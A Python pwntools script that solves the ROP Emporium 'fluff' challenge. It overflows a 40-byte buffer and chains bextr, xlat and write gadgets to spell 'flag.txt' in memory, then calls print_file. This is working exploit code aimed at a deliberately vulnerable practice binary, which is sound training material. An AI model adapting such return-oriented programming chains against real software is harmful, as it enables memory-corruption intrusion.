from pwn import *

chall = process("./fluff")
# chall.interactive()

# chall = gdb.debug("./fluff")

charOffsets = {
    'f':4,
    'l':1,
    'a':22,
    'g':15,
    ".":9,
    't':21,
    'x':776
}
def main():
    segment = b""
    alValue = 0xb
    dataAddr = 0x00601028
    rbx = 0x004003c0 # location of cool stuff

    setRdi = p64(0x004006a3)
    writeRdi = p64(0x00400639)
    stackAligner = p64(0x00400616)
    bextr = p64(0x0040062a)
    xlat = p64(0x00400628)
    printFile = p64(0x00400510)

    def setFlagChar(datIncrement, addValue, alVal):
        # set rdi to the correct increment
        payloadSegment = setRdi
        payloadSegment += p64(dataAddr + datIncrement)

        # set rdx
        payloadSegment += bextr
        payloadSegment += p64(0x6000) # 12 bytes from the start of rcx which should be all of rcx
        payloadSegment += p64(rbx - 0x3ef2 - alValue + charOffsets[addValue]) 

        # xlat to al
        payloadSegment += xlat
        alVal = ord(addValue)

        # write to [rdi]
        payloadSegment += writeRdi
        
        return (payloadSegment, alVal)


    junk = b"A"*40
    # test payload of just writting the letters fl
    payload = (junk)
    segment, alValue = setFlagChar(0,'f',alValue); payload += segment
    segment, alValue = setFlagChar(1,'l',alValue); payload += segment
    segment, alValue = setFlagChar(2,'a',alValue); payload += segment
    segment, alValue = setFlagChar(3,'g',alValue); payload += segment
    segment, alValue = setFlagChar(4,'.',alValue); payload += segment
    segment, alValue = setFlagChar(5,'t',alValue); payload += segment
    segment, alValue = setFlagChar(6,'x',alValue); payload += segment
    segment, alValue = setFlagChar(7,'t',alValue); payload += segment

    payload += (setRdi + p64(dataAddr) + printFile)
    print(len(payload))
    chall.sendafter(b">", payload)
    chall.interactive()
    
if __name__ == "__main__":
    main()